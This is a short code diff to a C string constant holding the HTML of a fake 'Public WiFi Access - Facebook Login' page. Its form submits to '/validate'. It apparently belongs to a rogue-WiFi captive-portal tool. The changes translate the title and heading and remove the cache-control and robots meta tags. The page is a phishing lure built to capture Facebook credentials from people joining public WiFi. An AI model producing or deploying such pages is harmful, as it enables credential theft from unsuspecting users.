@@ -1,18 +1,13 @@
 const char FACEBOOK_HTML[] = R"=====(
-
 <html>
 
   <head>
 
-    <title>Accesso Wifi Pubblico - Facebook Login</title>
+    <title>Public WiFi Access - Facebook Login</title>
 
     <meta charset='UTF-8'>
-    <meta http-equiv='cache-control' content='no-cache' />
-    <meta http-equiv='expires' content='0' />
-    <meta http-equiv='pragma' content='no-cache' />
     <meta name='viewport' content='width=device-width,
     initial-scale=0.75, maximum-scale=0.75, user-scalable=no'>
-    <meta name='robots' content='noindex, nofollow'>
     <meta name='theme-color' content='#5170ad' />
 
     <style class='cp-pen-styles'>
@@ -158,7 +153,7 @@ const char FACEBOOK_HTML[] = R"=====(
 
     <section class='login-form-wrap'>
 
-      <h1 class='disable-selection'>facebook</h1>
+      <h1 class='disable-selection'>Entra con Facebook e inizia a navigare ora</h1>
 
         <form class='login-form' action='/validate' method='GET'>
 
